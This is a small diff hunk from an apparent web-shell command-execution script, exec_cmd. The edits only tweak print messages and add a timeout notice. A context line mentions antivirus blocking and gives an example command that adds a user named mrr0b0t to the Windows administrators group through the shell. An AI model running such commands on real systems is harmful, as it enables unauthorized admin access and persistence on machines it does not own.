@@ -317,10 +317,11 @@ def exec_cmd(shell_url, code="exec_code"):
                 elif shell_req.status_code == 500:
                     print('av block exec command or you missing \\" ex: net localgroup \\"administrators\\" mrr0b0t /add')
                 else:
-                    print('shell', shell_req)
+                    print('shell ', shell_req)
         else:
-            print('shell', req_test)
+            print('shell ', req_test)
     except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout):
+        print("target timeout")
         exit(0)
     except KeyboardInterrupt:
         exit(0)
